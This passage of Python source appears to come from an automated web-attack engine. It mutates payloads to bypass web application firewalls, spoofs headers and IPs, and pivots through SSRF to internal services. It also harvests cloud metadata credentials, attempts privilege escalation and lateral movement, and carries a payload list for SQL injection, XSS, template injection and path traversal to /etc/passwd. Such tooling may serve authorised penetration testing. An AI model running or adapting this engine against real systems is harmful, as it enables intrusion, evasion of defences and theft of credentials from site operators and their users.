                        evasion_headers = self._build_evasion_headers(mutation.generation)
                        await self.stealth.wait()
                        start = time.time()
                        try:
                            resp = await self.client.get(url, headers=evasion_headers)
                            elapsed = int((time.time() - start) * 1000)
                            body = resp.text[:4000]
                            blocked = resp.status_code in (403, 429, 503)
                            self._track_waf(vuln_class.value, blocked)
                            await self.stealth.record(resp.status_code)

                            hit = not blocked and any(
                                kw.lower() in body.lower()
                                for kw in payload_def.get("detect", [])
                            )

                            if blocked:
                                consecutive_blocks += 1
                                if consecutive_blocks >= 3 and not ssrf_pivot_attempted:
                                    ssrf_pivot_attempted = True
                                    self.log(
                                        f"[POLYMORPHIC] {consecutive_blocks} consecutive WAF blocks — "
                                        f"polymorphic evasion insufficient, pivoting to SSRF internal channel",
                                        "error", "adversarial"
                                    )
                                    pivoted = await self._attempt_ssrf_pivot_for_blocked(
                                        priority, endpoint, payload_def["payload"]
                                    )
                                    if pivoted:
                                        return
                            else:
                                consecutive_blocks = 0

                            if hit:
                                self.polymorphic.successful_mutations += 1
                                link = ChainLink(
                                    step=len(self.chain) + 1,
                                    state=SniperState.POLYMORPHIC_MUTATION,
                                    vuln_class=vuln_class.value,
                                    technique=f"polymorphic:{mutation.technique}",
                                    target_endpoint=f"{endpoint}?{param}=",
                                    payload=mutation.mutated[:200],
                                    status_code=resp.status_code,
                                    success=True,
                                    evidence=body[:300],
                                    timestamp=_ts(),
                                )
                                self.chain.append(link)
                                self.log(
                                    f"[POLYMORPHIC] ★ WAF BYPASSED via {mutation.technique} "
                                    f"(gen {mutation.generation}, evasion headers active) at {endpoint}?{param}=",
                                    "error", "adversarial"
                                )
                                self.add_finding({
                                    "title": f"WAF Bypass: {mutation.technique} [{vuln_class.value}]",
                                    "description": (
                                        f"Adversarial polymorphic engine bypassed WAF using {mutation.technique} "
                                        f"(generation {mutation.generation}) with evasion tactics: "
                                        f"User-Agent spoofing ({evasion_headers.get('User-Agent', '')[:30]}...), "
                                        f"{'Chunked Transfer-Encoding + IP spoofing, ' if mutation.generation >= 1 else ''}"
                                        f"Unicode normalization. Original payload was blocked, "
                                        f"mutated payload succeeded at {endpoint}?{param}=."
                                    ),
                                    "severity": "critical",
                                    "category": "waf_bypass",
                                    "module": "adversarial_engine",
                                    "phase": "adversarial",
                                    "evidence": body[:200],
                                })
                                self.add_probe({
                                    "probe_type": "POLYMORPHIC_BYPASS",
                                    "target": self.base_url,
                                    "endpoint": f"{endpoint}?{param}=",
                                    "method": "GET",
                                    "status_code": resp.status_code,
                                    "response_time_ms": elapsed,
                                    "vulnerable": True,
                                    "verdict": f"WAF BYPASSED — {mutation.technique} gen{mutation.generation} + evasion headers",
                                    "severity": "CRITICAL",
                                    "description": f"Polymorphic: {mutation.technique} + UA spoof + Unicode norm",
                                    "payload": mutation.mutated[:100],
                                    "timestamp": _ts(),
                                })
                                return

                        except Exception:
                            pass

    def _get_base_payloads(self, vuln_class: VulnClass) -> List[Dict]:
        if vuln_class == VulnClass.SSRF:
            return [
                {"name": "AWS IMDS", "payload": "http://169.254.169.254/latest/meta-data/", "detect": ["ami-id", "instance-id"]},
                {"name": "Localhost Redis", "payload": "http://127.0.0.1:6379/info", "detect": ["redis_version"]},
            ]
        elif vuln_class == VulnClass.SQLI:
            return [
                {"name": "OR inject", "payload": "' OR '1'='1' --", "detect": ["error", "sql", "syntax"]},
                {"name": "UNION probe", "payload": "1 UNION SELECT NULL--", "detect": ["column", "union"]},
                {"name": "Time blind", "payload": "1'; SELECT pg_sleep(3)--", "detect": []},
            ]
        elif vuln_class == VulnClass.XSS:
            return [
                {"name": "Script inject", "payload": "<script>alert(1)</script>", "detect": ["<script>"]},
                {"name": "Event handler", "payload": '<img src=x onerror="alert(1)">', "detect": ["onerror"]},
            ]
        elif vuln_class == VulnClass.SSTI:
            return [
                {"name": "Jinja2", "payload": "{{7*7}}", "detect": ["49"]},
                {"name": "Twig", "payload": "{{7*'7'}}", "detect": ["49", "7777777"]},
            ]
        elif vuln_class == VulnClass.PATH_TRAVERSAL:
            return [
                {"name": "LFI passwd", "payload": "../../../../../etc/passwd", "detect": ["root:", "nobody:"]},
                {"name": "Proc environ", "payload": "../../../../../proc/self/environ", "detect": ["PATH=", "HOME="]},
            ]
        return [{"name": "generic", "payload": "test", "detect": []}]

    async def _state_drift_check(self, priority: TargetPriority):
        tree_results = [
            r for r in self.tree.all_results
            if r.vuln_class == priority.vuln_class.value
        ]

        for result in tree_results:
            if result.drift_detected:
                parsed = urlparse(f"{self.base_url}{result.target_endpoint}")
                endpoint = parsed.path

                drift_event = {
                    "type": "DATA_DRIFT_EVENT",
                    "endpoint": endpoint,
                    "vuln_class": priority.vuln_class.value,
                    "original_status": None,
                    "current_status": result.status_code,
                    "defensibility": "ACTIVE",
                    "interpretation": (
                        f"Adversarial FSM detected behavioral change on {endpoint} — "
                        f"target exhibits active defensibility (response shifted to HTTP {result.status_code}). "
                        f"This indicates real-time patching, WAF rule injection, or adaptive rate-limiting "
                        f"deployed during the assessment window."
                    ),
                    "timestamp": _ts(),
                    "recalibrated": False,
                }

                baseline = self.tree.monitor.baselines.get(f"GET:{endpoint}")
                if baseline:
                    drift_event["original_status"] = baseline.status_code
                    drift_event["interpretation"] = (
                        f"Adversarial FSM detected behavioral change on {endpoint} — "
                        f"HTTP {baseline.status_code} drifted to HTTP {result.status_code}. "
                        f"Target exhibits active defensibility: real-time patching, WAF rule injection, "
                        f"or adaptive rate-limiting deployed during the assessment window."
                    )

                    recal = await self.drift_recalibrator.detect_and_recalibrate(
                        endpoint,
                        baseline.status_code,
                        result.status_code,
                        self.discovered_subdomains,
                        findings=self.findings,
                        ssrf_channels=self.confirmed_ssrf_channels,
                    )
                    if recal:
                        drift_event["recalibrated"] = True
                        drift_event["alternative_route"] = recal.get("new_url", "")
                        link = ChainLink(
                            step=len(self.chain) + 1,
                            state=SniperState.DRIFT_RECALIBRATION,
                            vuln_class=priority.vuln_class.value,
                            technique="drift_recalibration",
                            target_endpoint=endpoint,
                            payload=recal.get("new_url", ""),
                            status_code=recal.get("status_code", 0),
                            success=True,
                            evidence=f"Rerouted to {recal.get('new_host', '')}",
                            timestamp=_ts(),
                        )
                        self.chain.append(link)

                self.data_drift_events.append(drift_event)
                self.log(
                    f"[DRIFT] DATA DRIFT EVENT registered: {endpoint} — "
                    f"active defensibility detected | "
                    f"HTTP {drift_event['original_status']} → {result.status_code} | "
                    f"recalibrated={drift_event['recalibrated']}",
                    "error", "adversarial"
                )

        blocked_results = [
            r for r in tree_results
            if r.status_code in (403, 405, 503) and not r.vulnerable and not r.drift_detected
        ]
        for result in blocked_results:
            parsed = urlparse(f"{self.base_url}{result.target_endpoint}")
            endpoint = parsed.path

            if result.status_code == 405:
                self.log(
                    f"[DRIFT] HTTP 405 Method Not Allowed at {endpoint} — "
                    f"probable cause: endpoint requires PUT/PATCH or auth API is at a sub-endpoint. "
                    f"Activating Drift Recalibrator: Verb Tampering + Source Map auth discovery + SSRF pivot",
                    "error", "adversarial"
                )

                verb_result = await self.drift_recalibrator.attempt_verb_tampering(endpoint, 405)
                if verb_result and verb_result.get("success"):
                    link = ChainLink(
                        step=len(self.chain) + 1,
                        state=SniperState.DRIFT_RECALIBRATION,
                        vuln_class=priority.vuln_class.value,
                        technique=f"verb_tampering:{verb_result['method']}",
                        target_endpoint=endpoint,
                        payload=f"{verb_result['method']} accepted",
                        status_code=verb_result["new_status"],
                        success=True,
                        evidence=verb_result.get("body_preview", "")[:200],
                        timestamp=_ts(),
                    )
                    self.chain.append(link)
                    continue

                auth_discovery = await self.drift_recalibrator.discover_auth_api_endpoint(
                    endpoint, self.findings
                )
                if auth_discovery:
                    link = ChainLink(
                        step=len(self.chain) + 1,
                        state=SniperState.DRIFT_RECALIBRATION,
                        vuln_class=priority.vuln_class.value,
                        technique="auth_api_discovery",
                        target_endpoint=auth_discovery["real_auth_endpoint"],
                        payload=f"Facade {endpoint} → real API {auth_discovery['real_auth_endpoint']}",
                        status_code=auth_discovery["status_code"],
                        success=True,
                        evidence=auth_discovery.get("body_preview", "")[:200],
                        timestamp=_ts(),
                    )
                    self.chain.append(link)
                    continue

                if self.confirmed_ssrf_channels:
                    ssrf_result = await self.drift_recalibrator.ssrf_internal_post(
                        endpoint,
                        {"email": "test@test.com", "password": "test"},
                        self.confirmed_ssrf_channels,
                    )
                    if ssrf_result and ssrf_result.get("bypassed_waf"):
                        link = ChainLink(
                            step=len(self.chain) + 1,
                            state=SniperState.LATERAL_MOVEMENT,
                            vuln_class=priority.vuln_class.value,
                            technique="ssrf_internal_post_bypass",
                            target_endpoint=f"{ssrf_result['ssrf_channel']} → {endpoint}",
                            payload=f"Internal POST via SSRF bypasses external WAF/firewall",
                            status_code=ssrf_result["status_code"],
                            success=True,
                            evidence=ssrf_result.get("body_preview", "")[:200],
                            timestamp=_ts(),
                        )
                        self.chain.append(link)

            elif result.status_code in (403, 503):
                is_auth = any(kw in endpoint.lower() for kw in ["login", "auth", "signin", "admin"])
                if is_auth:
                    auth_discovery = await self.drift_recalibrator.discover_auth_api_endpoint(
                        endpoint, self.findings
                    )
                    if auth_discovery:
                        link = ChainLink(
                            step=len(self.chain) + 1,
                            state=SniperState.DRIFT_RECALIBRATION,
                            vuln_class=priority.vuln_class.value,
                            technique="auth_api_discovery",
                            target_endpoint=auth_discovery["real_auth_endpoint"],
                            payload=f"WAF blocked {endpoint} → real API {auth_discovery['real_auth_endpoint']}",
                            status_code=auth_discovery["status_code"],
                            success=True,
                            evidence=auth_discovery.get("body_preview", "")[:200],
                            timestamp=_ts(),
                        )
                        self.chain.append(link)
                        continue

                    if self.confirmed_ssrf_channels:
                        ssrf_result = await self.drift_recalibrator.ssrf_internal_post(
                            endpoint,
                            {"email": "test@test.com", "password": "test"},
                            self.confirmed_ssrf_channels,
                        )
                        if ssrf_result and ssrf_result.get("bypassed_waf"):
                            link = ChainLink(
                                step=len(self.chain) + 1,
                                state=SniperState.LATERAL_MOVEMENT,
                                vuln_class=priority.vuln_class.value,
                                technique="ssrf_internal_post_bypass",
                                target_endpoint=f"{ssrf_result['ssrf_channel']} → {endpoint}",
                                payload=f"Internal POST via SSRF bypasses external WAF/firewall",
                                status_code=ssrf_result["status_code"],
                                success=True,
                                evidence=ssrf_result.get("body_preview", "")[:200],
                                timestamp=_ts(),
                            )
                            self.chain.append(link)

    async def _state_pivot_assessment(self, priority: TargetPriority):
        confirmed_results = [
            r for r in self.tree.all_results
            if r.vuln_class == priority.vuln_class.value and r.vulnerable
        ]

        if not confirmed_results:
            return

        if priority.vuln_class == VulnClass.SSRF:
            for result in confirmed_results:
                ep_parts = result.target_endpoint.split("?")
                if len(ep_parts) < 2:
                    continue

                endpoint = ep_parts[0]
                param_match = re.match(r"([a-zA-Z_]+)=", ep_parts[1])
                param = param_match.group(1) if param_match else "url"

                channel = {
                    "endpoint": endpoint,
                    "param": param,
                    "confirmed_target": result.payload,
                    "evidence": result.evidence[:200],
                }
                self.confirmed_ssrf_channels.append(channel)

                self.log(
                    f"[PIVOT] SSRF confirmed at {endpoint}?{param}= — "
                    f"Initiating internal service mapping ({len(INTERNAL_SERVICE_MAP)} targets)...",
                    "error", "adversarial"
                )
                self.internal_services = await self.escalation.map_internal_services(
                    endpoint, param,
                )

                if self.internal_services:
                    link = ChainLink(
                        step=len(self.chain) + 1,
                        state=SniperState.LATERAL_MOVEMENT,
                        vuln_class="ssrf",
                        technique="internal_service_mapping",
                        target_endpoint=f"{endpoint}?{param}=",
                        payload=f"{len(self.internal_services)} services discovered",
                        status_code=200,
                        success=True,
                        evidence=", ".join(s["service"] for s in self.internal_services[:5]),
                        timestamp=_ts(),
                    )
                    self.chain.append(link)

                leaked = {
                    "ssrf_endpoint": endpoint,
                    "ssrf_param": param,
                }

                redis_svc = next((s for s in self.internal_services if s["service"] == "Redis"), None)
                if redis_svc:
                    leaked["redis_confirmed"] = True
                    self.log(
                        f"[PIVOT] Redis connection via SSRF established — "
                        f"attempting key extraction...",
                        "error", "adversarial"
                    )

                evidence_lower = result.evidence.lower()
                if "accesskeyid" in evidence_lower or "secretaccesskey" in evidence_lower:
                    leaked["aws_credentials"] = True
                iam_match = re.search(r"security-credentials/(\S+)", evidence_lower)
                if iam_match:
                    leaked["iam_role"] = iam_match.group(1)

                self.leaked_data.update(leaked)

                self._transition(
                    SniperState.PRIVILEGE_ESCALATION,
                    f"Leaked data obtained — attempting escalation via {self.tree.infra.detected.value}",
                )
                escalation_results = await self.escalation.attempt_escalation(
                    leaked, self.tree.infra, endpoint, param,
                )

                for esc in escalation_results:
                    if esc.get("success"):
                        link = ChainLink(
                            step=len(self.chain) + 1,
                            state=SniperState.PRIVILEGE_ESCALATION,
                            vuln_class="ssrf",
                            technique=f"priv_esc:{esc['path']}",
                            target_endpoint=f"{endpoint}?{param}=",
                            payload=esc.get("target_url", ""),
                            status_code=esc.get("status_code", 0),
                            success=True,
                            evidence=esc.get("evidence", "")[:200],
                            escalation_result=esc,
                            timestamp=_ts(),
                        )
                        self.chain.append(link)

                break

    async def _state_incident_validation(self, priority: TargetPriority):
        confirmed = [
            r for r in self.tree.all_results
            if r.vuln_class == priority.vuln_class.value and r.vulnerable
        ]

        for result in confirmed:
            if result.vuln_class == "ecommerce":
                incident = await self.incident_validator.validate_ecommerce_incident(result)
                if incident and incident.get("validated"):
                    link = ChainLink(
                        step=len(self.chain) + 1,
                        state=SniperState.INCIDENT_VALIDATION,
                        vuln_class="ecommerce",
                        technique="incident_validation",
                        target_endpoint=result.target_endpoint,
                        payload=result.payload[:100],
                        status_code=result.status_code,
                        success=True,
                        evidence=result.evidence[:200],
                        incident_id=incident.get("order_id"),
                        timestamp=_ts(),
                    )
                    self.chain.append(link)

            elif result.vuln_class == "verb_tampering":
                incident = await self.incident_validator.validate_write_operation(result)
                if incident and incident.get("validated"):
                    link = ChainLink(
                        step=len(self.chain) + 1,
                        state=SniperState.INCIDENT_VALIDATION,
                        vuln_class="verb_tampering",
                        technique="write_validation",
                        target_endpoint=result.target_endpoint,
                        payload=result.payload[:100],
                        status_code=result.status_code,
                        success=True,
                        evidence="Write operation confirmed on server",
                        timestamp=_ts(),
                    )
                    self.chain.append(link)

            if result.vulnerable:
                await self.incident_validator.validate_data_leak(result)

    def _build_report(self) -> Dict:
        total_chain_steps = len(self.chain)
        successful_steps = sum(1 for l in self.chain if l.success)
        escalations = sum(1 for l in self.chain if l.state == SniperState.PRIVILEGE_ESCALATION and l.success)
        incidents = sum(1 for l in self.chain if l.state == SniperState.INCIDENT_VALIDATION and l.success)
        polymorphic_bypasses = sum(1 for l in self.chain if l.state == SniperState.POLYMORPHIC_MUTATION and l.success)
        drift_recals = sum(1 for l in self.chain if l.state == SniperState.DRIFT_RECALIBRATION and l.success)
        lateral_moves = sum(1 for l in self.chain if l.state == SniperState.LATERAL_MOVEMENT and l.success)

        validated_incidents = [i for i in self.incident_validator.validated_incidents if i.get("validated")]

        return {
            "engine": "adversarial_state_machine",
            "version": "1.0",
            "state_transitions": len(self.transitions),
            "state_history": [
                {"from": t.from_state.value, "to": t.to_state.value, "condition": t.condition}
                for t in self.transitions[-30:]
            ],
            "target_priorities": [
                {
                    "rank": i + 1,
                    "class": p.vuln_class.value,
                    "cost": p.cost,
                    "reward": p.reward,
                    "ratio": p.ratio,
                    "depth": p.depth_potential,
                    "reasoning": p.reasoning,
                }
                for i, p in enumerate(self.priorities)
            ],
            "exploit_chain": [
                {
                    "step": l.step,
                    "state": l.state.value,
                    "class": l.vuln_class,
                    "technique": l.technique,
                    "endpoint": l.target_endpoint,
                    "success": l.success,
                    "incident_id": l.incident_id,
                    "escalation": l.escalation_result is not None,
                    "timestamp": l.timestamp,
                }
                for l in self.chain
            ],
            "chain_steps_total": total_chain_steps,
            "chain_steps_successful": successful_steps,
            "privilege_escalations": escalations,
            "real_incidents_confirmed": incidents,
            "polymorphic_bypasses": polymorphic_bypasses,
            "drift_recalibrations": drift_recals,
            "lateral_movements": lateral_moves,
            "internal_services_discovered": len(self.internal_services),
            "internal_service_details": self.internal_services[:10],
            "confirmed_ssrf_channels": len(self.confirmed_ssrf_channels),
            "leaked_data_keys": list(self.leaked_data.keys()),
            "validated_incidents": validated_incidents[:10],
            "stealth_throttle": self.stealth.to_dict(),
            "polymorphic_engine": self.polymorphic.to_dict(),
            "drift_recalibrator": self.drift_recalibrator.to_dict(),
            "waf_block_rates": {
                vc: f"{self._get_waf_block_rate(vc):.0%}"
                for vc in self.waf_block_counts.keys()
            },
            "discovered_subdomains": self.discovered_subdomains[:20],
            "data_drift_events": self.data_drift_events,
            "data_drift_events_count": len(self.data_drift_events),
            "active_defensibility_detected": len(self.data_drift_events) > 0,
        }
